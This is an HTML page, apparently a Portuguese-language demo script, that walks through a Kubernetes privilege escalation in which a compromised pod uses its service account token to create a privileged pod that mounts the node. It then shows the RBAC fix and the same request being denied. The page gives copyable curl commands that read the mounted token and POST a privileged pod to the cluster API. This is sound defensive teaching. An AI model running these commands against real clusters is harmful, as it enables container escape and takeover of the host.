@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Roteiro · Cavaleiro 2 — Privilege Escalation (RBAC)</title>
+<style>
+  :root{
+    --bg:#0d0d0f; --surface:#161619; --surface2:#1d1d22; --border:#2a2a31;
+    --text:#ededf0; --muted:#9a9aa6; --bright:#ffffff; --cmd-bg:#08080a;
+    --mono:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
+    --sans:system-ui,-apple-system,Segoe UI,Roboto,sans-serif;
+  }
+  *{box-sizing:border-box}
+  html{scroll-behavior:smooth}
+  body{margin:0;background:var(--bg);color:var(--text);font-family:var(--sans);line-height:1.6;-webkit-font-smoothing:antialiased}
+  .wrap{max-width:860px;margin:0 auto;padding:0 24px 120px}
+  nav.top{position:sticky;top:0;background:rgba(13,13,15,.92);backdrop-filter:blur(8px);border-bottom:1px solid var(--border);display:flex;gap:4px;align-items:center;padding:10px 24px;margin:0 -24px 40px;font-size:13px;flex-wrap:wrap}
+  nav.top a{color:var(--muted);text-decoration:none;padding:4px 10px;border-radius:6px;letter-spacing:.02em}
+  nav.top a:hover{color:var(--bright);background:var(--surface2)}
+  nav.top a.here{color:var(--bright);background:var(--surface2);font-weight:600}
+  nav.top .sep{flex:1}
+  header{padding:32px 0 28px;border-bottom:1px solid var(--border);margin-bottom:36px}
+  .kicker{font-family:var(--mono);font-size:12px;letter-spacing:.28em;text-transform:uppercase;color:var(--muted)}
+  h1{font-size:34px;line-height:1.15;margin:14px 0 6px;letter-spacing:-.01em}
+  .roman{font-family:var(--mono);font-size:13px;color:var(--muted)}
+  .tagline{font-size:17px;color:var(--muted);font-style:italic;margin-top:18px;border-left:2px solid var(--border);padding-left:16px}
+  .cwd{font-family:var(--mono);font-size:13px;color:var(--muted);margin-top:22px;background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:10px 14px}
+  .cwd b{color:var(--text)}
+  .step{background:var(--surface);border:1px solid var(--border);border-radius:14px;padding:22px 24px;margin:18px 0}
+  .step-h{display:flex;align-items:baseline;gap:14px;margin-bottom:6px}
+  .num{font-family:var(--mono);font-size:14px;color:var(--bg);background:var(--text);min-width:26px;height:26px;border-radius:50%;display:inline-flex;align-items:center;justify-content:center;font-weight:700;flex-shrink:0;transform:translateY(3px)}
+  .step h2{font-size:19px;margin:0;font-weight:600;letter-spacing:-.01em}
+  .say{margin:12px 0 14px;color:#cfcfd6;font-style:italic;font-size:15.5px;border-left:2px solid #3a3a44;padding:2px 0 2px 16px}
+  .say::before{content:"";font-style:normal;opacity:.5}
+  .cmd{position:relative;background:var(--cmd-bg);border:1px solid var(--border);border-radius:10px;margin:12px 0}
+  .cmd pre{margin:0;padding:16px 18px;overflow-x:auto;font-family:var(--mono);font-size:14px;line-height:1.7}
+  .cmd code{color:#eaeaf0;white-space:pre}
+  .copy{position:absolute;top:9px;right:9px;background:var(--surface2);color:var(--muted);border:1px solid var(--border);border-radius:7px;padding:5px 11px;font-size:12px;font-family:var(--mono);cursor:pointer;transition:.15s}
+  .copy:hover{color:var(--bright);border-color:#444}
+  .expect{display:flex;gap:10px;align-items:flex-start;color:var(--muted);font-size:14.5px;margin:12px 2px 0}
+  .expect .ic{font-family:var(--mono);color:var(--text);flex-shrink:0}
+  .expect b{color:var(--text);font-weight:600}
+  .punch{border-color:#4a4a55}
+  .punch .num{background:var(--bright)}
+  .reset{margin-top:40px;border:1px dashed var(--border);border-radius:12px;padding:20px 24px;background:#101013}
+  .reset h3{margin:0 0 6px;font-size:15px;font-family:var(--mono);letter-spacing:.1em;text-transform:uppercase;color:var(--muted)}
+  .fnav{display:flex;justify-content:space-between;margin-top:48px;gap:12px;font-size:14px}
+  .fnav a{color:var(--muted);text-decoration:none;border:1px solid var(--border);border-radius:8px;padding:10px 16px;transition:.15s}
+  .fnav a:hover{color:var(--bright);border-color:#444}
+  .note{font-size:13.5px;color:var(--muted);margin-top:10px;background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:10px 14px}
+  @media(max-width:600px){h1{font-size:27px}.wrap{padding:0 16px 80px}}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <nav class="top">
+    <a href="cavaleiro-1-supply-chain.html">I · Entrar</a>
+    <a href="cavaleiro-2-privileged.html" class="here">II · Executar</a>
+    <a href="cavaleiro-3-network.html">III · Movimentar</a>
+    <a href="cavaleiro-4-secrets.html">IV · Roubar</a>
+    <span class="sep"></span>
+    <a href="../explicacao-4-cavaleiros.html">↳ Explicação</a>
+  </nav>
+
+  <header>
+    <div class="kicker">Cavaleiro II — Executar</div>
+    <h1>Privileged Containers</h1>
+    <div class="roman">Service Account · RBAC · Privilege Escalation</div>
+    <div class="tagline">"Não precisa de root no host. Precisa do token certo. Você não escreveu privileged — o RBAC deixou o atacante escrever."</div>
+    <div class="cwd">Rode a partir de: <b>demo/cavaleiro-2-privileged/</b> &nbsp;·&nbsp; tudo é executado <b>de dentro do pod comprometido</b></div>
+  </header>
+
+  <section class="step">
+    <div class="step-h"><span class="num">1</span><h2>O cenário: um app que pode "create pods"</h2></div>
+    <blockquote class="say">"Uma ServiceAccount com permissão de criar pods — 'o app orquestra workers'. Parece inofensivo."</blockquote>
+    <div class="cmd"><button class="copy" onclick="copyCmd(this)">copiar</button><pre><code>kubectl apply -f cenario.yaml</code></pre></div>
+    <p class="expect"><span class="ic">→</span> <span>Um pod normal sobe, com uma SA que pode <b>create pods</b>.</span></p>
+  </section>
+
+  <section class="step">
+    <div class="step-h"><span class="num">2</span><h2>De dentro do pod, o token já fala com a API interna</h2></div>
+    <blockquote class="say">"O atacante não invade o API server de fora. Ele já está no pod — e o pod nasceu com o token montado e a rota para a API."</blockquote>
+    <div class="cmd"><button class="copy" onclick="copyCmd(this)">copiar</button><pre><code>kubectl -n c2-privileged exec app-comprometido -- sh -c \
+  'curl -sk -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" https://kubernetes.default.svc/version'</code></pre></div>
+    <p class="expect"><span class="ic">→</span> <span>A API responde. <b>Sem kubectl externo, sem kubeconfig</b> — só o token montado.</span></p>
+  </section>
+
+  <section class="step punch">
+    <div class="step-h"><span class="num">3</span><h2>Escalada: criar o pod privilegiado via API</h2></div>
+    <blockquote class="say">"Você nunca escreveu privileged: true. Não precisou — bastou a SA poder criar pods."</blockquote>
+    <div class="cmd"><button class="copy" onclick="copyCmd(this)">copiar</button><pre><code>kubectl -n c2-privileged exec -i app-comprometido -- sh -c \
+  'curl -sk -X POST -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" -H "Content-Type: application/yaml" https://kubernetes.default.svc/api/v1/namespaces/c2-privileged/pods --data-binary @-' \
+  &lt; pod-privilegiado.yaml</code></pre></div>
+    <p class="expect"><span class="ic">→</span> <span>A API responde <b>201</b>: o atacante criou um pod privilegiado que monta o node.</span></p>
+  </section>
+
+  <section class="step punch">
+    <div class="step-h"><span class="num">4</span><h2>Prova: o pod do atacante lê o node</h2></div>
+    <div class="cmd"><button class="copy" onclick="copyCmd(this)">copiar</button><pre><code>kubectl -n c2-privileged exec pod-do-atacante -- cat /host/etc/os-release</code></pre></div>
+    <p class="expect"><span class="ic">→</span> <span>Sai o sistema do <b>node</b> (não do container). O host está exposto.</span></p>
+  </section>
+
+  <section class="step">
+    <div class="step-h"><span class="num">5</span><h2>A defesa: RBAC sem "create"</h2></div>
+    <blockquote class="say">"A correção não é proibir privileged. É tirar do app o poder que ele nunca precisou."</blockquote>
+    <div class="cmd"><button class="copy" onclick="copyCmd(this)">copiar</button><pre><code>kubectl apply -f defesa.yaml</code></pre></div>
+    <p class="expect"><span class="ic">→</span> <span>O mesmo Role, agora só com <b>get/list</b>. O token continua válido, mas sem o poder perigoso.</span></p>
+  </section>
+
+  <section class="step punch">
+    <div class="step-h"><span class="num">6</span><h2>O mesmo ataque, agora negado</h2></div>
+    <div class="cmd"><button class="copy" onclick="copyCmd(this)">copiar</button><pre><code>kubectl -n c2-privileged exec -i app-comprometido -- sh -c \
+  'curl -sk -o /dev/null -w "%{http_code}\n" -X POST -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" -H "Content-Type: application/yaml" https://kubernetes.default.svc/api/v1/namespaces/c2-privileged/pods --data-binary @-' \
+  &lt; pod-privilegiado.yaml</code></pre></div>
+    <p class="expect"><span class="ic">✗</span> <span><b>403</b> — mesmo token, mesma chamada, agora Forbidden. Mudou o que a credencial tem direito de fazer.</span></p>
+    <div class="note">Camadas extras: <code>automountServiceAccountToken: false</code> nem monta o token; PSS/Kyverno barram o pod privilegiado mesmo que o RBAC falhe; user namespaces (1.36) cortam o escape de kernel.</div>
+  </section>
+
+  <div class="reset">
+    <h3>Reset</h3>
+    <div class="cmd"><button class="copy" onclick="copyCmd(this)">copiar</button><pre><code>kubectl delete -f pod-privilegiado.yaml -f cenario.yaml --ignore-not-found</code></pre></div>
+  </div>
+
+  <div class="fnav">
+    <a href="cavaleiro-1-supply-chain.html">← Cavaleiro I · Entrar</a>
+    <a href="cavaleiro-3-network.html">Cavaleiro III · Movimentar →</a>
+  </div>
+</div>
+
+<script>
+function copyCmd(btn){
+  const code = btn.parentElement.querySelector('code');
+  const text = code.innerText.replace(/^\s*\$\s?/gm,'').trim();
+  const done=()=>{const t=btn.textContent;btn.textContent='copiado ✓';setTimeout(()=>btn.textContent=t,1200);};
+  if(navigator.clipboard && window.isSecureContext){
+    navigator.clipboard.writeText(text).then(done).catch(()=>fallbackCopy(text,done));
+  }else{fallbackCopy(text,done);}
+}
+function fallbackCopy(text,done){
+  const ta=document.createElement('textarea');
+  ta.value=text;ta.style.position='fixed';ta.style.top='-9999px';
+  document.body.appendChild(ta);ta.focus();ta.select();
+  try{document.execCommand('copy');done();}catch(e){}
+  document.body.removeChild(ta);
+}
+</script>
+</body>
+</html>
